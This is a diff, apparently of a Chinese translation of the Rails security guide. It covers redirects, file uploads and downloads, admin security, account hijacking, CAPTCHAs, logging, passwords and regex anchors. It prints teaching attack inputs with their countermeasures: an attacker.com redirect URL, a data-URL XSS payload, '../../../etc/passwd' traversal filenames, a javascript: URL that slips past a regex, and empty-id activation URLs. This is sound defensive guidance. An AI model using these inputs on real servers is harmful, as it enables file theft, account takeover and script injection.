+只要允许用户指定重定向地址，就有可能被攻击。最常见的攻击方式是把用户重定向到一个和正牌网站看起来一模一样虚假网站。这叫做“钓鱼攻击”。攻击者把不会被怀疑的链接通过邮件发给用户，在链接中注入跨站脚本，或者把链接放在其他网站中。用户之所以不怀疑，是因为链接以熟知的网站域名开头，转向恶意网站的地址隐藏在重定向参数中，例如 http://www.example.com/site/redirect?to= www.attacker.com。我们来看下面这个 `legacy` 动作：
 
-```ruby
+{:lang="ruby"}
+~~~
 def legacy
   redirect_to(params.update(action:'main'))
 end
-```
+~~~
 
-This will redirect the user to the main action if they tried to access a legacy action. The intention was to preserve the URL parameters to the legacy action and pass them to the main action. However, it can be exploited by attacker if they included a host key in the URL:
+如果用户访问 `legacy` 动作，会转向 `main` 动作。其作用是保护 URL 参数，将其转向 `main` 动作。但是，如果攻击者在 URL 中指定 `host` 参数仍能用来攻击：
 
-```
+~~~
 http://www.example.com/site/legacy?param1=xy&param2=23&host=www.attacker.com
-```
+~~~
 
-If it is at the end of the URL it will hardly be noticed and redirects the user to the attacker.com host. A simple countermeasure would be to _include only the expected parameters in a legacy action_ (again a whitelist approach, as opposed to removing unexpected parameters). _And if you redirect to an URL, check it with a whitelist or a regular expression_.
+如果 `host` 参数出现在地址的末尾，用户很难察觉，最终被重定向到 attacker.com。对此，一种简单的对策是只允许在 `legacy` 动作中使用指定的参数（使用白名单，而不是删除不该使用的参数）。如果重定向到一个地址，要通过白名单或正则表达式检查目标地址。
 
-#### Self-contained XSS
+#### 独立跨站脚本攻击 {#self-contained-xss}
 
-Another redirection and self-contained XSS attack works in Firefox and Opera by the use of the data protocol. This protocol displays its contents directly in the browser and can be anything from HTML or JavaScript to entire images:
+还有一种重定向和独立跨站脚本攻击可通过在 Firefox 和 Opera 中使用 data 协议实现。data 协议直接把内容显示在浏览器中，可以包含任何 HTML 或 JavaScript，以及完整的图片：
 
-`data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K`
+~~~
+data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K
+~~~
 
-This example is a Base64 encoded JavaScript which displays a simple message box. In a redirection URL, an attacker could redirect to this URL with the malicious code in it. As a countermeasure, _do not allow the user to supply (parts of) the URL to be redirected to_.
+这是个使用 Base64 编码的 JavaScript 代码，显示一个简单的弹出窗口。在重定向地址中，攻击者可以通过这段恶意代码把用户引向这个地址。对此，一个对策是禁止用户指定重定向的地址。
 
-### File Uploads
+### 文件上传 {#file-uploads}
 
-NOTE: _Make sure file uploads don't overwrite important files, and process media files asynchronously._
+I> 确保上传的文件不会覆盖重要的文件，而且要异步处理文件上传过程。
 
-Many web applications allow users to upload files. _File names, which the user may choose (partly), should always be filtered_ as an attacker could use a malicious file name to overwrite any file on the server. If you store file uploads at /var/www/uploads, and the user enters a file name like "../../../etc/passwd", it may overwrite an important file. Of course, the Ruby interpreter would need the appropriate permissions to do so - one more reason to run web servers, database servers and other programs as a less privileged Unix user.
+很多网页程序都允许用户上传文件。程序应该过滤文件名，因为用户可以（部分）指定文件名，攻击者可以使用恶意的文件名覆盖服务器上的任意文件。如果上传的文件存储在 `/var/www/uploads` 文件夹中，用户可以把上传的文件命名为 `../../../etc/passwd`，这样就覆盖了重要文件。当然了，Ruby 解释器需要特定的授权才能这么做。这也是为什么要使用权限更少的用户运行网页服务器、数据库服务器等程序的原因。
 
-When filtering user input file names, _don't try to remove malicious parts_. Think of a situation where the web application removes all "../" in a file name and an attacker uses a string such as "....//" - the result will be "../". It is best to use a whitelist approach, which _checks for the validity of a file name with a set of accepted characters_. This is opposed to a blacklist approach which attempts to remove not allowed characters. In case it isn't a valid file name, reject it (or replace not accepted characters), but don't remove them. Here is the file name sanitizer from the [attachment_fu plugin](https://github.com/technoweenie/attachment_fu/tree/master):
+过滤用户上传文件的文件名时，不要只删除恶意部分。设想这样一种情况，网页程序删除了文件名中的所有 `../`，但是攻击者可以使用 `....//`，得到的结果还是 `../`。最好使用白名单，确保文件名中只包含指定的字符。这和黑名单的做法不同，黑名单只是简单的把不允许使用的字符删掉。如果文件名不合法，拒绝使用即可（或者替换成允许使用的字符），不要删除不可用的字符。下面这个文件名清理方法摘自 [attachment_fu](https://github.com/technoweenie/attachment_fu/tree/master) 插件。
 
-```ruby
+{:lang="ruby"}
+~~~
 def sanitize_filename(filename)
   filename.strip.tap do |name|
     # NOTE: File.basename doesn't work right with Windows paths on Unix
@@ -311,598 +326,624 @@ def sanitize_filename(filename)
     name.gsub! /[^\w\.\-]/, '_'
   end
 end
-```
+~~~
 
-A significant disadvantage of synchronous processing of file uploads (as the attachment_fu plugin may do with images), is its _vulnerability to denial-of-service attacks_. An attacker can synchronously start image file uploads from many computers which increases the server load and may eventually crash or stall the server.
+同步处理文件上传一个明显的缺点是，容易受到“拒绝服务”（denial-of-service，简称 DOS）攻击。攻击者可以同时在多台电脑上上传图片，增加服务器负载，最终有可能导致服务器宕机。
 
-The solution to this is best to _process media files asynchronously_: Save the media file and schedule a processing request in the database. A second process will handle the processing of the file in the background.
+所以最好异步处理媒体文件的上传过程：保存媒体文件，然后在数据库中排期一个处理请求，让另一个进程在后台上传文件。
 
-### Executable Code in File Uploads
+### 上传文件中的可执行代码 {#executable-code-in-file-uploads}
 
-WARNING: _Source code in uploaded files may be executed when placed in specific directories. Do not place file uploads in Rails' /public directory if it is Apache's home directory._
+W> 如果把上传的文件存放在特定的文件夹中，其中的源码会被执行。如果 `/public` 文件夹是 Apache 的根目录，就不能把上传的文件保存在这个文件夹里。
 
-The popular Apache web server has an option called DocumentRoot. This is the home directory of the web site, everything in this directory tree will be served by the web server. If there are files with a certain file name extension, the code in it will be executed when requested (might require some options to be set). Examples for this are PHP and CGI files. Now think of a situation where an attacker uploads a file "file.cgi" with code in it, which will be executed when someone downloads the file.
+使用广泛的 Apache 服务器有个选项叫做 `DocumentRoot`。这个选项指定网站的根目录，这个文件夹中的所有文件都会由服务器伺服。如果文件使用特定的扩展名（例如 PHP 和 CGI 文件），请求该文件时会执行其中包含的代码（可能还要设置其他选项）。假设攻击者上传了一个名为 `file.cgi` 的文件，用户下载这个文件时就会执行其中的代码。
 
-_If your Apache DocumentRoot points to Rails' /public directory, do not put file uploads in it_, store files at least one level downwards.
+如果 Apache 的 `DocumentRoot` 指向 Rails 的 `/public` 文件夹，请不要把上传的文件放在这个文件夹中， 至少要放在子文件夹中。
 
-### File Downloads
+### 文件下载 {#file-downloads}
 
-NOTE: _Make sure users cannot download arbitrary files._
+I> 确保用户不能随意下载文件。
 
-Just as you have to filter file names for uploads, you have to do so for downloads. The send_file() method sends files from the server to the client. If you use a file name, that the user entered, without filtering, any file can be downloaded:
+就像过滤上传文件的文件名一样，下载文件时也要这么做。`send_file()` 方法可以把服务器上的文件发送到客户端，如果不过滤用户提供的文件名，可以下载任何一个文件：
 
-```ruby
+{:lang="ruby"}
+~~~
 send_file('/var/www/uploads/' + params[:filename])
-```
+~~~
 
-Simply pass a file name like "../../../etc/passwd" to download the server's login information. A simple solution against this, is to _check that the requested file is in the expected directory_:
+把文件名设为 `../../../etc/passwd` 就能下载服务器的登录信息。一个简单的对策是，检查请求的文件是否在指定的文件夹中：
 
-```ruby
+{:lang="ruby"}
+~~~
 basename = File.expand_path(File.join(File.dirname(__FILE__), '../../files'))
 filename = File.expand_path(File.join(basename, @file.public_filename))
 raise if basename !=
      File.expand_path(File.join(File.dirname(filename), '../../../'))
 send_file filename, disposition: 'inline'
-```
+~~~
 
-Another (additional) approach is to store the file names in the database and name the files on the disk after the ids in the database. This is also a good approach to avoid possible code in an uploaded file to be executed. The attachment_fu plugin does this in a similar way.
+另外一种方法是把文件名保存在数据库中，然后用数据库中的 ID 命名存储在硬盘上的文件。这样也能有效避免执行上传文件中的代码。attachment_fu 插件使用的就是类似方式。
 
-Intranet and Admin Security
----------------------------
+## 局域网和管理界面的安全 {#intranet-and-admin-security}
 
-Intranet and administration interfaces are popular attack targets, because they allow privileged access. Although this would require several extra-security measures, the opposite is the case in the real world.
+局域网和管理界面是常见的攻击目标，因为这些地方有访问特权。局域网和管理界面需要多种安全防护措施，但实际情况却不理想。
 
-In 2007 there was the first tailor-made trojan which stole information from an Intranet, namely the "Monster for employers" web site of Monster.com, an online recruitment web application. Tailor-made Trojans are very rare, so far, and the risk is quite low, but it is certainly a possibility and an example of how the security of the client host is important, too. However, the highest threat to Intranet and Admin applications are XSS and CSRF. 
+2007 年出现了第一个专门用于窃取局域网信息的木马，名为“Monster for employers”，攻击 Monster.com 这个在线招聘网站。迄今为止，特制的木马虽然很少出现，但却表明了客户端安全的重要性。不过，局域网和管理界面面对的最大威胁是 XSS 和 CSRF。
 
-**XSS** If your application re-displays malicious user input from the extranet, the application will be vulnerable to XSS. User names, comments, spam reports, order addresses are just a few uncommon examples, where there can be XSS.
+**XSS** 如果转发了来自外部网络的恶意内容，程序有可能受到 XSS 攻击。用户名、评论、垃圾信息过滤程序、订单地址等都是经常被 XSS 攻击的对象。
 
-Having one single place in the admin interface or Intranet, where the input has not been sanitized, makes the entire application vulnerable. Possible exploits include stealing the privileged administrator's cookie, injecting an iframe to steal the administrator's password or installing malicious software through browser security holes to take over the administrator's computer.
+如果局域网或管理界面的输入没有过滤，整个程序都处在危险之中。可能的攻击包括：窃取有权限的管理员 cookie，注入 iframe 偷取管理员的密码，通过浏览器漏洞安装恶意软件控制管理员的电脑。
 
-Refer to the Injection section for countermeasures against XSS. It is _recommended to use the SafeErb plugin_ also in an Intranet or administration interface.
+XSS 的对策参阅“[注入](#injection)”一节。在局域网和管理界面中也推荐使用 SafeErb 插件。
 
-**CSRF** Cross-Site Request Forgery (CSRF), also known as Cross-Site Reference Forgery (XSRF), is a gigantic attack method, it allows the attacker to do everything the administrator or Intranet user may do. As you have already seen above how CSRF works, here are a few examples of what attackers can do in the Intranet or admin interface.
+**CSRF** 跨站请求伪造（Cross-Site Request Forgery，简称 CSRF 或者 XSRF）是一种防不胜防的攻击方式，攻击者可以用其做管理员和局域网内用户能做的一切操作。CSRF 的工作方式前文已经介绍过，下面我们来看一下攻击者能在局域网或管理界面中做些什么。
 
-A real-world example is a [router reconfiguration by CSRF](http://www.h-online.com/security/Symantec-reports-first-active-attack-on-a-DSL-router--/news/102352). The attackers sent a malicious e-mail, with CSRF in it, to Mexican users. The e-mail claimed there was an e-card waiting for them, but it also contained an image tag that resulted in a HTTP-GET request to reconfigure the user's router (which is a popular model in Mexico). The request changed the DNS-settings so that requests to a Mexico-based banking site would be mapped to the attacker's site. Everyone who accessed the banking site through that router saw the attacker's fake web site and had their credentials stolen.
+一个真实地案例是[通过 CSRF 重新设置路由器](http://www.h-online.com/security/Symantec-reports-first-active-attack-on-a-DSL-router--/news/102352)。攻击者向墨西哥用户发送了一封包含 CSRF 的恶意电子邮件，声称有一封电子贺卡。邮件中还有一个图片标签，发起 HTTP GET 请求，重新设置用户的路由器。这个请求修改了 DNS 设置，如果用户访问墨西哥的银行网站，会被带到攻击者的网站。只要通过这个路由器访问银行网站，用户就会被引向攻击者的网站，导致密码被偷。
 
-Another example changed Google Adsense's e-mail address and password by. If the victim was logged into Google Adsense, the administration interface for Google advertisements campaigns, an attacker could change their credentials. 
+还有一个案例是修改 Google Adsense 账户的 Email 地址和密码。如果用户登录 Google Adsense，攻击者就能窃取密码。
 
-Another popular attack is to spam your web application, your blog or forum to propagate malicious XSS. Of course, the attacker has to know the URL structure, but most Rails URLs are quite straightforward or they will be easy to find out, if it is an open-source application's admin interface. The attacker may even do 1,000 lucky guesses by just including malicious IMG-tags which try every possible combination.
+另一种常见的攻击方式是在网站中发布垃圾信息，通过博客或论坛传播恶意的跨站脚本。当然了，攻击者要知道地址的结构，不过大多数 Rails 程序的地址结构一目了然。如果程序是开源的，也很容易找出地址的结构。攻击者甚至可以通过恶意的图片标签猜测，尝试各种可能的组合，幸运的话不会超过一千次。
 
-For _countermeasures against CSRF in administration interfaces and Intranet applications, refer to the countermeasures in the CSRF section_.
+在局域网和管理界面防范 CSRF 的方法参见“[CSRF 的对策](#csrf-countermeasures)”一节。
 
-### Additional Precautions
+### 其他预防措施 {#additional-precautions}
 
-The common admin interface works like this: it's located at www.example.com/admin, may be accessed only if the admin flag is set in the User model, re-displays user input and allows the admin to delete/add/edit whatever data desired. Here are some thoughts about this:
+管理界面一般都位于 www.example.com/admin，或许只有 `User` 模型的 `admin` 字段为 `true` 时才能访问。管理界面显示了用户的输入内容，管理员可根据需求删除、添加和编辑数据。我对管理界面的一些想法：
 
-* It is very important to _think about the worst case_: What if someone really got hold of your cookies or user credentials. You could _introduce roles_ for the admin interface to limit the possibilities of the attacker. Or how about _special login credentials_ for the admin interface, other than the ones used for the public part of the application. Or a _special password for very serious actions_?
+* 一定要考虑最坏的情况：如果有人得到了我的 cookie 或密码该怎么办。你可以为管理界面引入用户角色，限制攻击者的权限。也可为管理界面使用特殊的密码，和网站前台不一样。也许每个重要的动作都使用单独的特殊密码也是个不错的主意。
 
-* Does the admin really have to access the interface from everywhere in the world? Think about _limiting the login to a bunch of source IP addresses_. Examine request.remote_ip to find out about the user's IP address. This is not bullet-proof, but a great barrier. Remember that there might be a proxy in use, though.
+* 管理界面有必要能从世界各地访问吗？考虑一下限制能登陆的 IP 地址段。使用 `request.remote_ip` 可以获取用户的 IP 地址。这一招虽不能保证万无一失，但却是道有力屏障。使用时要注意代理的存在。
 
-* _Put the admin interface to a special sub-domain_ such as admin.application.com and make it a separate application with its own user management. This makes stealing an admin cookie from the usual domain, www.application.com, impossible. This is because of the same origin policy in your browser: An injected (XSS) script on www.application.com may not read the cookie for admin.application.com and vice-versa.
+* 把管理界面放到单独的子域名中，例如 admin.application.com，使用独立的程序及用户管理系统。这样就不可能从 www.application.com 中窃取管理密码了，因为浏览器中有同源原则：注入 www.application.com 中的跨站脚本无法读取 admin.application.com 中的 cookie，反之亦然。
 
-User Management
----------------
+## 用户管理 {#user-management}
 
-NOTE: _Almost every web application has to deal with authorization and authentication. Instead of rolling your own, it is advisable to use common plug-ins. But keep them up-to-date, too. A few additional precautions can make your application even more secure._
+I> 几乎每个网页程序都要处理权限和认证。不要自己实现这些功能，推荐使用常用的插件，而且要及时更新。除此之外还有一些预防措施，可以让程序更安全。
 
-There are a number of authentication plug-ins for Rails available. Good ones, such as the popular [devise](https://github.com/plataformatec/devise) and [authlogic](https://github.com/binarylogic/authlogic), store only encrypted passwords, not plain-text passwords. In Rails 3.1 you can use the built-in `has_secure_password` method which has similar features.
+Rails 身份认证插件很多，比较好的有 [devise](https://github.com/plataformatec/devise) 和 [authlogic](https://github.com/binarylogic/authlogic)。这些插件只存储加密后的密码，不会存储明文。从 Rails 3.1 起，可以使用内建的 `has_secure_password` 方法实现类似的功能。
 
-Every new user gets an activation code to activate their account when they get an e-mail with a link in it. After activating the account, the activation_code columns will be set to NULL in the database. If someone requested an URL like these, they would be logged in as the first activated user found in the database (and chances are that this is the administrator):
+注册后程序会生成一个激活码，用户会收到一封包含激活链接的邮件。激活账户后，数据库中的 `activation_code` 字段被设为 `NULL`。如果有人访问类似的地址，就能以在数据库中查到的第一个激活的用户身份登录程序，这个用户极有可能是管理员：
 
-```
+~~~
 http://localhost:3006/user/activate
 http://localhost:3006/user/activate?id=
-```
+~~~
 
-This is possible because on some servers, this way the parameter id, as in params[:id], would be nil. However, here is the finder from the activation action:
+这么做之所以可行，是因为在某些服务器上，访问上述地址后，ID 参数（`params[:id]`）的值是 `nil`。查找激活码的方法如下：
 
-```ruby
+{:lang="ruby"}
+~~~
 User.find_by_activation_code(params[:id])
-```
+~~~
 
-If the parameter was nil, the resulting SQL query will be
+如果 ID 为 `nil`，生成的 SQL 查询如下：
 
-```sql
+{:lang="sql"}
+~~~
 SELECT * FROM users WHERE (users.activation_code IS NULL) LIMIT 1
-```
+~~~
 
-And thus it found the first user in the database, returned it and logged them in. You can find out more about it in [this blog post](http://www.rorsecurity.info/2007/10/28/restful_authentication-login-security/). _It is advisable to update your plug-ins from time to time_. Moreover, you can review your application to find more flaws like this.
+查询到的是数据库中的第一个用户，返回给动作并登入该用户。详细说明参见[我博客上的文章](http://www.rorsecurity.info/2007/10/28/restful_authentication-login-security/)。因此建议经常更新插件。而且，审查程序的代码也可以发现类似问题。
 
-### Brute-Forcing Accounts
+### 暴力破解账户 {#brute-forcing-accounts}
 
-NOTE: _Brute-force attacks on accounts are trial and error attacks on the login credentials. Fend them off with more generic error messages and possibly require to enter a CAPTCHA._
+I> 暴力破解需要不断尝试，根据错误提示做改进。提供模糊的错误消息、使用验证码可以避免暴力破解。
 
-A list of user names for your web application may be misused to brute-force the corresponding passwords, because most people don't use sophisticated passwords. Most passwords are a combination of dictionary words and possibly numbers. So armed with a list of user names and a dictionary, an automatic program may find the correct password in a matter of minutes.
+网页程序中显示的用户列表可被用来暴力破解用户的密码，因为大多数用户使用的密码都不复杂。大多数密码都是由字典单词和数字组成的。只要有一组用户名和字典，自动化程序就能在数分钟内找到正确的密码。
 
-Because of this, most web applications will display a generic error message "user name or password not correct", if one of these are not correct. If it said "the user name you entered has not been found", an attacker could automatically compile a list of user names.
+因此，大多数网页程序都会显示更模糊的错误消息，例如“用户名或密码错误”。如果提示“未找到您输入的用户名”，攻击者会自动生成用户名列表。
 
-However, what most web application designers neglect, are the forgot-password pages. These pages often admit that the entered user name or e-mail address has (not) been found. This allows an attacker to compile a list of user names and brute-force the accounts.
+不过，被大多数开发者忽略的是忘记密码页面。这个页面经常会提示能否找到输入的用户名或邮件地址。攻击者据此可以生成用户名列表，用于暴力破解账户。
 
-In order to mitigate such attacks, _display a generic error message on forgot-password pages, too_. Moreover, you can _require to enter a CAPTCHA after a number of failed logins from a certain IP address_. Note, however, that this is not a bullet-proof solution against automatic programs, because these programs may change their IP address exactly as often. However, it raises the barrier of an attack.
+为了尽量避免这种攻击，忘记密码页面上显示的错误消息也要模糊一点。如果同一 IP 地址多次登录失败后，还可以要求输入验证码。注意，这种方法不能完全禁止自动化程序，因为自动化程序能频繁更换 IP 地址。不过也算增加了一道防线。
 
-### Account Hijacking
+### 盗取账户 {#account-hijacking}
 
-Many web applications make it easy to hijack user accounts. Why not be different and make it more difficult?.
+很多程序的账户很容易盗取，为什么不增加盗窃的难度呢？
 
-#### Passwords
+#### 密码 {#passwords}
 
-Think of a situation where an attacker has stolen a user's session cookie and thus may co-use the application. If it is easy to change the password, the attacker will hijack the account with a few clicks. Or if the change-password form is vulnerable to CSRF, the attacker will be able to change the victim's password by luring them to a web page where there is a crafted IMG-tag which does the CSRF. As a countermeasure, _make change-password forms safe against CSRF_, of course. And _require the user to enter the old password when changing it_.
+攻击者一旦窃取了用户的会话 cookie 就能进入程序。如果能轻易修改密码，几次点击之后攻击者就能盗用账户。如果修改密码的表单有 CSRF 漏洞，攻击者可以把用户引诱到一个精心制作的网页，其中包含可发起跨站请求伪造的图片。针对这种攻击的对策是，在修改密码的表单中加入 CSRF 防护，而且修改密码前要输入原密码。
 
-#### E-Mail
+#### E-Mail {#e-mail}
 
-However, the attacker may also take over the account by changing the e-mail address. After they change it, they will go to the forgotten-password page and the (possibly new) password will be mailed to the attacker's e-mail address. As a countermeasure _require the user to enter the password when changing the e-mail address, too_.
+攻击者还可通过修改 Email 地址盗取账户。修改 Email 地址后，攻击者到忘记密码页面输入邮箱地址，新密码就会发送到攻击者提供的邮箱中。针对这种攻击的对策是，修改 Email 地址时要输入密码。
 
-#### Other
+#### 其他 {#other}
 
-Depending on your web application, there may be more ways to hijack the user's account. In many cases CSRF and XSS will help to do so. For example, as in a CSRF vulnerability in [Google Mail](http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/). In this proof-of-concept attack, the victim would have been lured to a web site controlled by the attacker. On that site is a crafted IMG-tag which results in a HTTP GET request that changes the filter settings of Google Mail. If the victim was logged in to Google Mail, the attacker would change the filters to forward all e-mails to their e-mail address. This is nearly as harmful as hijacking the entire account. As a countermeasure, _review your application logic and eliminate all XSS and CSRF vulnerabilities_.
+不同的程序盗取账户的方式也不同。大多数情况下都要利用 CSRF 和 XSS。例如 [Google Mail](http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/) 中的 CSRF 漏洞。在这个概念性的攻击中，用户被引向攻击者控制的网站。网站中包含一个精心制作的图片，发起 HTTP GET 请求，修改 Google Mail 的过滤器设置。如果用户登入 Google Mail，攻击者就能修改过滤器，把所有邮件都转发到自己的邮箱中。这几乎和账户被盗的危险性相同。针对这种攻击的对策是，审查程序的逻辑，封堵所有 XSS 和 CSRF 漏洞。
 
-### CAPTCHAs
+### 验证码 {#captchas}
 
-INFO: _A CAPTCHA is a challenge-response test to determine that the response is not generated by a computer. It is often used to protect comment forms from automatic spam bots by asking the user to type the letters of a distorted image. The idea of a negative CAPTCHA is not for a user to prove that they are human, but reveal that a robot is a robot._
+I> 验证码是质询-响应测试，用于判断响应是否由计算机生成。经常用在评论表单中，要求用户输入图片中扭曲的文字，禁止垃圾评论机器人发布评论。验证的目的不是为了证明用户是人类，而是为了证明机器人是机器人。
 
-But not only spam robots (bots) are a problem, but also automatic login bots. A popular CAPTCHA API is [reCAPTCHA](http://recaptcha.net/) which displays two distorted images of words from old books. It also adds an angled line, rather than a distorted background and high levels of warping on the text as earlier CAPTCHAs did, because the latter were broken. As a bonus, using reCAPTCHA helps to digitize old books. [ReCAPTCHA](https://github.com/ambethia/recaptcha/) is also a Rails plug-in with the same name as the API.
+我们要防护的不仅是垃圾评论机器人，还有自动登录机器人。使用广泛的 [reCAPTCHA](http://recaptcha.net/) 会显示两个扭曲的图片，其中的文字摘自古籍，图片中还会显示一条直角线。早期的验证码使用扭曲的背景和高度变形的文字，但这种方式已经被破解了。reCAPTCHA 的这种做法还有个附加好处，可以数字化古籍。[ReCAPTCHA](https://github.com/ambethia/recaptcha/) 是个 Rails 插件，和所用 API 同名。
 
-You will get two keys from the API, a public and a private key, which you have to put into your Rails environment. After that you can use the recaptcha_tags method in the view, and the verify_recaptcha method in the controller. Verify_recaptcha will return false if the validation fails.
-The problem with CAPTCHAs is, they are annoying. Additionally, some visually impaired users have found certain kinds of distorted CAPTCHAs difficult to read. The idea of negative CAPTCHAs is not to ask a user to proof that they are human, but reveal that a spam robot is a bot.
+你会从 reCAPTCHA 获取两个密钥，一个公匙，一个私匙，这两个密钥要放到 Rails 程序的设置中。然后就可以在视图中使用 `recaptcha_tags` 方法，在控制器中使用 `verify_recaptcha` 方法。如果验证失败，`verify_recaptcha` 方法返回 `false`。验证码的问题是很烦人。而且，有些视觉受损的用户发现某些扭曲的验证码很难看清。
 
-Most bots are really dumb, they crawl the web and put their spam into every form's field they can find. Negative CAPTCHAs take advantage of that and include a "honeypot" field in the form which will be hidden from the human user by CSS or JavaScript.
+大多数机器人都很笨拙，会填写爬取页面表单中的每个字段。验证码正式利用这一点，在表单中加入一个诱引字段，通过 CSS 或 JavaScript 对用户隐藏。
 
-Here are some ideas how to hide honeypot fields by JavaScript and/or CSS:
+通过 JavaScript 和 CSS 隐藏诱引字段可以使用下面的方法：
 
-* position the fields off of the visible area of the page
-* make the elements very small or color them the same as the background of the page
-* leave the fields displayed, but tell humans to leave them blank
+* 把字段移到页面的可视范围之外；
+* 把元素的大小设的很小，或者把颜色设的和背景色一样；
+* 显示这个字段，但告诉用户不要填写；
 
-The most simple negative CAPTCHA is one hidden honeypot field. On the server side, you will check the value of the field: If it contains any text, it must be a bot. Then, you can either ignore the post or return a positive result, but not saving the post to the database. This way the bot will be satisfied and moves on. You can do this with annoying users, too.
+最简单的方法是使用隐藏的诱引字段。在服务器端要检查这个字段的值：如果包含任何文本，就说明这是个机器人。然后可以忽略这次请求，或者返回真实地结果，但不能把数据存入数据库。这样一来，机器人就以为完成了任务，继续前往下一站。对付讨厌的人也可以用这种方法。
 
-You can find more sophisticated negative CAPTCHAs in Ned Batchelder's [blog post](http://nedbatchelder.com/text/stopbots.html):
+Ned Batchelder 的[博客](http://nedbatchelder.com/text/stopbots.html)中介绍了更复杂的验证码。
 
-* Include a field with the current UTC time-stamp in it and check it on the server. If it is too far in the past, or if it is in the future, the form is invalid.
-* Randomize the field names
-* Include more than one honeypot field of all types, including submission buttons
+注意，验证码只能防范自动机器人，不能阻止特别制作的机器人。所以，验证码或许不是登录表单的最佳防护措施。
 
-Note that this protects you only from automatic bots, targeted tailor-made bots cannot be stopped by this. So _negative CAPTCHAs might not be good to protect login forms_.
+### 日志 {#logging}
 
-### Logging
+W> 告诉 Rails 不要把密码写入日志。
 
-WARNING: _Tell Rails not to put passwords in the log files._
+默认情况下，Rails 会把请求的所有信息写入日志。日志文件是个严重的安全隐患，因为其中可能包含登录密码和信用卡卡号等。考虑程序的安全性时，要想到攻击者获得服务器控制权这一情况。如果把明文密码写入日志，数据库再怎么加密也无济于事。在程序的设置文件中可以通过 `config.filter_parameters` 过滤指定的请求参数，不写入日志。过滤掉的参数在日志中会使用 `[FILTERED]` 代替。
 
-By default, Rails logs all requests being made to the web application. But log files can be a huge security issue, as they may contain login credentials, credit card numbers et cetera. When designing a web application security concept, you should also think about what will happen if an attacker got (full) access to the web server. Encrypting secrets and passwords in the database will be quite useless, if the log files list them in clear text. You can _filter certain request parameters from your log files_ by appending them to `config.filter_parameters` in the application configuration. These parameters will be marked [FILTERED] in the log.
-
-```ruby
+{:lang="ruby"}
+~~~
 config.filter_parameters << :password
-```
+~~~
 
-### Good Passwords
+### 好密码 {#good-passwords}
 
-INFO: _Do you find it hard to remember all your passwords? Don't write them down, but use the initial letters of each word in an easy to remember sentence._
+I> 你是否发现很难记住所有密码？不要把密码记下来，使用容易记住的句子中单词的首字母。
 
-Bruce Schneier, a security technologist, [has analyzed](http://www.schneier.com/blog/archives/2006/12/realworld_passw.html) 34,000 real-world user names and passwords from the MySpace phishing attack mentioned <a href="#examples-from-the-underground">below</a>. It turns out that most of the passwords are quite easy to crack. The 20 most common passwords are:
+安全专家 Bruce Schneier 研究了钓鱼攻击（[如下](#examples-from-the-underground)所示）获取的 34000 个真实的 MySpace 用户名和密码，发现大多数密码都很容易破解。最常用的 20 个密码是：
 
-password1, abc123, myspace1, password, blink182, qwerty1, ****you, 123abc, baseball1, football1, 123456, soccer, monkey1, liverpool1, princess1, jordan23, slipknot1, superman1, iloveyou1, and monkey.
+password1, abc123, myspace1, password, blink182, qwerty1, ****you, 123abc, baseball1, football1, 123456, soccer, monkey1, liverpool1, princess1, jordan23, slipknot1, superman1, iloveyou1, monkey
 
-It is interesting that only 4% of these passwords were dictionary words and the great majority is actually alphanumeric. However, password cracker dictionaries contain a large number of today's passwords, and they try out all kinds of (alphanumerical) combinations. If an attacker knows your user name and you use a weak password, your account will be easily cracked.
+这些密码只有不到 4% 使用了字典中能找到的单词，而且大都由字母和数字组成。破解密码的字典中包含大多数常用的密码，攻击者会尝试所有可能的组合。如果攻击者知道你的用户名，而且密码很弱，你的账户就很容易被破解。
 
-A good password is a long alphanumeric combination of mixed cases. As this is quite hard to remember, it is advisable to enter only the _first letters of a sentence that you can easily remember_. For example "The quick brown fox jumps over the lazy dog" will be "Tqbfjotld". Note that this is just an example, you should not use well known phrases like these, as they might appear in cracker dictionaries, too.
+好的密码是一组很长的字符串，混合字母和数字。这种密码很难记住，建议你使用容易记住的长句的首字母。例如，从“The quick brown fox jumps over the lazy dog”中得到的密码是“Tqbfjotld”。注意，我只是举个例子，请不要使用熟知的名言，因为破解字典中可能有这些名言。
 
-### Regular Expressions
+### 正则表达式 {#regular-expressions}
 
-INFO: _A common pitfall in Ruby's regular expressions is to match the string's beginning and end by ^ and $, instead of \A and \z._
+I> 使用 Ruby 正则表达式时经常犯的错误是使用 `^` 和 `$` 分别匹配字符串的开头和结尾，其实应该使用 `\A` 和 `\z`。
 
-Ruby uses a slightly different approach than many other languages to match the end and the beginning of a string. That is why even many Ruby and Rails books get this wrong. So how is this a security threat? Say you wanted to loosely validate a URL field and you used a simple regular expression like this:
+Ruby 使用了有别于其他编程语言的方式来匹配字符串的开头和结尾。这也是为什么很多 Ruby/Rails 相关的书籍都搞错了。为什么这是个安全隐患呢？如果想不太严格的验证 URL 字段，使用了如下的正则表达式：
 
-```ruby
-  /^https?:\/\/[^\n]+$/i
-```
+{:lang="ruby"}
+~~~
+/^https?:\/\/[^\n]+$/i
+~~~
 
-This may work fine in some languages. However, _in Ruby ^ and $ match the **line** beginning and line end_. And thus a URL like this passes the filter without problems:
+在某些编程语言中可能没问题，但在 Ruby 中，`^` 和 `$` 分别匹配一行的开头和结尾。因此下面这种 URL 能通过验证：
 
-```
+~~~
 javascript:exploit_code();/*
 http://hi.com
 */
-```
+~~~
 
-This URL passes the filter because the regular expression matches - the second line, the rest does not matter. Now imagine we had a view that showed the URL like this:
+之所以能通过，是因为第二行匹配了正则表达式，其他两行无关紧要。假设在视图中要按照下面的方式显示 URL：
 
-```ruby
-  link_to "Homepage", @user.homepage
-```
+{:lang="ruby"}
+~~~
+link_to "Homepage", @user.homepage
+~~~
 
-The link looks innocent to visitors, but when it's clicked, it will execute the JavaScript function "exploit_code" or any other JavaScript the attacker provides.
+访问者不会觉得这个链接有问题，点击之后，却执行了 `exploit_code` 这个 JavaScript 函数，或者攻击者提供的其他 JavaScript 代码。
 
-To fix the regular expression, \A and \z should be used instead of ^ and $, like so:
+修正这个正则表达式的方法是，分别用 `\A` 和 `\z` 代替 `^` 和 `$`，如下所示：
 
-```ruby
-  /\Ahttps?:\/\/[^\n]+\z/i
-```
+{:lang="ruby"}
+~~~
+/\Ahttps?:\/\/[^\n]+\z/i
+~~~
 
